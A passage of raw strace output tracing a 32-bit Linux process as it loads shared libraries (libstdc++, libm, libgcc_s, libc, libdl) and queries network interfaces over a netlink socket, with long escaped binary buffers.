\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
+29844 15:04:56.626116 fstat64(7, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+29844 15:04:56.626136 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7f8b000
+29844 15:04:56.626163 mmap2(0xb7fb8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x2c) = 0xb7fb8000
+29844 15:04:56.626188 close(7)          = 0
+29844 15:04:56.626201 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.626216 open("/usr/lib/libstdc++.so.6", O_RDONLY) = 7
+29844 15:04:56.626230 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`*\4\0004\0\0\0\10\313\16\0\0\0\0\0004\0 \0\7\0(\0\36\0\35\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340|\16\0\340|\16\0\5\0\0\0\0\20\0\0\1\0\0\0000\211\16\0000\211\16\0000\211\16\0\300@\0\0\334\235\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\272\16\0\34\272\16\0\34\272\16\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\7\0\0\0000\211\16\0000\211\16\0000\211\16\0\0\0\0\0\10\0\0\0\4\0\0\0\4\0\0\0P\345td\364>\f\0\364>\f\0\364>\f\0004F\0\0004F\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td0\211\16\0000\211\16\0000\211\16\0\3046\0\0\3046\0\0\4\0\0\0\1\0\0\0\377\3\0\0\0\r\0\0S\5\0\0\17\v\0\0\331\n\0\0{\3\0\0v\v\0\0\f\6\0\0\340\6\0\0\351\1\0\0\362\n\0\0P\0\0\0\305\7\0\0\212\t\0\0&\4\0\0i\0\0\0+\v\0\0\0\0\0\0\322\6\0\0\0\0\0\0L\0\0\0\22\v\0\0\350\t\0\0\367\f\0\0I\5\0\0\263\n\0\0\t\10\0\0\3\0\0\0\326\t\0\0{\2\0\0M\v\0\0a\6\0\0\314\t\0\0\0\0\0\0/\1\0\0\364\2\0\0\374\4\0\0\362\f\0\0\330\2\0\0\321\4\0\0P\4\0\0U\5\0\0\314\2\0\0\354\2\0\0\0\v\0\0\356\2\0\0R\6\0\0\363\2\0\0\t\f\0\0X\1\0\0@\2\0\0\256\10\0\0g\n\0\0C\7\0\0\330\t\0\0D\t\0\0\0\0\0\0\251\1\0\0\'\n\0\0", 512) = 512
+29844 15:04:56.626342 fstat64(7, {st_mode=S_IFREG|0644, st_size=970680, ...}) = 0
+29844 15:04:56.626374 mmap2(NULL, 993036, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7e98000
+29844 15:04:56.626386 mmap2(0xb7f80000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0xe8) = 0xb7f80000
+29844 15:04:56.626402 mmap2(0xb7f85000, 22284, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f85000
+29844 15:04:56.626416 close(7)          = 0
+29844 15:04:56.626428 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.626441 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 7
+29844 15:04:56.626457 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
+29844 15:04:56.626580 fstat64(7, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
+29844 15:04:56.626613 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e97000
+29844 15:04:56.626627 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7e72000
+29844 15:04:56.626638 mmap2(0xb7e95000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x23) = 0xb7e95000
+29844 15:04:56.626653 close(7)          = 0
+29844 15:04:56.626666 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.626681 open("/lib/libgcc_s.so.1", O_RDONLY) = 7
+29844 15:04:56.626693 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\31\0\0004\0\0\0\224\242\0\0\0\0\0\0004\0 \0\5\0(\0\33\0\32\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\350\236\0\0\350\236\0\0\5\0\0\0\0\20\0\0\1\0\0\0\0\240\0\0\0\240\0\0\0\240\0\0\250\1\0\0\344\2\0\0\6\0\0\0\0\20\0\0\2\0\0\0\24\240\0\0\24\240\0\0\24\240\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0P\345tdl\224\0\0l\224\0\0l\224\0\0\244\1\0\0\244\1\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0a\0\0\0m\0\0\0\0\0\0\0001\0\0\0`\0\0\0\0\0\0\0\34\0\0\0=\0\0\0\0\0\0\0)\0\0\0?\0\0\0*\0\0\0O\0\0\0\0\0\0\0008\0\0\0A\0\0\0003\0\0\0\0\0\0\0\0\0\0\0V\0\0\0g\0\0\0\0\0\0\0\0\0\0\0005\0\0\0T\0\0\0\0\0\0\0\0\0\0\0-\0\0\0\0\0\0\0b\0\0\0W\0\0\0\0\0\0\0d\0\0\0\r\0\0\0\0\0\0\0c\0\0\0\3\0\0\0 \0\0\0&\0\0\0009\0\0\0N\0\0\0\23\0\0\0\0\0\0\0(\0\0\0J\0\0\0j\0\0\0\0\0\0\0\0\0\0\0\26\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0\0\0\0\0\36\0\0\0+\0\0\0\'\0\0\0Q\0\0\0\0\0\0\0%\0\0\0\"\0\0\0\n\0\0\0\0\0\0\0_\0\0\0\35\0\0\0\0\0\0\0\0\0\0\0l\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\6\0\0\0,\0\0\0\0\0\0\0\0\0\0\0\t\0\0\0", 512) = 512
+29844 15:04:56.626783 fstat64(7, {st_mode=S_IFREG|0644, st_size=42700, ...}) = 0
+29844 15:04:56.626801 mmap2(NULL, 41700, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7e67000
+29844 15:04:56.626812 mmap2(0xb7e71000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0xa) = 0xb7e71000
+29844 15:04:56.626825 close(7)          = 0
+29844 15:04:56.626837 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.626851 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+29844 15:04:56.626865 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
+29844 15:04:56.626958 fstat64(7, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+29844 15:04:56.626975 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7d18000
+29844 15:04:56.626987 mmap2(0xb7e61000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x149) = 0xb7e61000
+29844 15:04:56.627002 mmap2(0xb7e64000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e64000
+29844 15:04:56.627015 close(7)          = 0
+29844 15:04:56.627070 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29844 15:04:56.627099 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 7
+29844 15:04:56.627114 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
+29844 15:04:56.627204 fstat64(7, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+29844 15:04:56.627221 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7d14000
+29844 15:04:56.627233 mmap2(0xb7d16000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1) = 0xb7d16000
+29844 15:04:56.627249 close(7)          = 0
+29844 15:04:56.627275 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d13000
+29844 15:04:56.627290 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d13940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+29844 15:04:56.627345 mprotect(0xb7e61000, 4096, PROT_READ) = 0
+29844 15:04:56.627623 mprotect(0xb7f80000, 12288, PROT_READ) = 0
+29844 15:04:56.627658 munmap(0xb7fbb000, 29913) = 0
+29844 15:04:56.627732 brk(0)            = 0x805d000
+29844 15:04:56.627742 brk(0x8082000)    = 0x8082000
+29844 15:04:56.627773 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {SIG_DFL}, 8) = 0
+29844 15:04:56.627792 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb9c878) = -1 EINVAL (Invalid argument)
+29844 15:04:56.627810 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29844 15:04:56.627830 socket(PF_NETLINK, SOCK_RAW, 0) = 7
+29844 15:04:56.627845 bind(7, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
+29844 15:04:56.627859 getsockname(7, {sa_family=AF_NETLINK, pid=29844, groups=00000000}, [12]) = 0
+29844 15:04:56.627878 time(NULL)        = 1495652696
+29844 15:04:56.627889 sendto(7, "\24\0\0\0\26\0\1\3X\331%Y\0\0\0\0\0\0\0\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20
+29844 15:04:56.627911 recvmsg(7, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"0\0\0\0\24\0\2\0X\331%Y\224t\0\0\2\10\200\376\1\0\0\0\10\0\1\0\177\0\0\1\10\0\2\0\177\0\0\1\7\0\3\0lo\0\0<\0\0\0\24\0\2\0X\331%Y\224t\0\0\2\30\200\0\2\0\0\0\10\0\1\0\n\0\2\5\10\0\2\0\n\0\2\5\10\0\4\0\n\0\2\377\t\0\3\0eth0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306e\374\267\264\25\376\267+F\321\267\344\274\271\277\211B\375\267+F\321\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0t\277\271\277\220\331\374\267!F\321\267R\203\346\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+F\321\267\0\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\210u\351\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0R\203\346\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306e\374\267\264\25\376\267r\241\322\267p\275\271\277\211B\375\267r\241\322\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0\0\300\271\277\220\331\374\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\241\322\267\0\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\340r\351\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\276\271\277\30\276\271\277|p\321\267\300\277\271\277\235\310\374\267Lp\321\267Fu\351\2670u\351\267H\203\346\267\370\275\271\277\211B\375\267H\203\346\267<u\351\267\364\17\376\267\340r\351\267\270}\346\267\210\300\271\277\220\331\374\267H\203\346\267R\203\346\267\374\34\0\0\374\34\0\0\0\0\0\0\5\0\0\0H\203\346\267\0@\0\0 \20\376\267|0\0\0\0\0\0\0008p\351\267\210u\351\267H\276\271\277\365\241\375\267\10\0\0\0hu\351\267R\203\346\267\224\276\271\277\237\1\375\267Fu\351\2670u\351\267\235N\347\267x\276\271\277\211B\375\267\235N\347\267<u\351\267\364\17\376\267\340r\351\267\270}\346\267\10\301\271\277\220\331\374\267\235N\347\267R\203\346\267\364\17\376\2670\276\271\277\210u\351\267\300\277\271\277\235N\347\267\7\0\0\0 \20\376\267\0\0\0\0\0\0\0\0\230M\374\267\0\0\0\0\310\276\271\277\365\241\375\267\10\0\0\0\364\17\376\267R\203\346\267\340r\351\267\340\276\271\277\365\241\375\267`h\374\267\10\0\0\0 \20\376\267\0\276\271\2774\300\271\277\7\0\0\0\351\3\371\267\306e\374\267\264\25\376\267<\17\355\267\30\277\271\277\211B\375\267<\17\355\267\270e\374\267\364\17\376\267\240\22\376\267\0\0\0\0\250\301\271\277\220\331\374\267\26\17\355\267R\203\346\267\2\0\0\0X\300\271\0Lp\321\267|p\321\267<\17\355\267|0\0\0 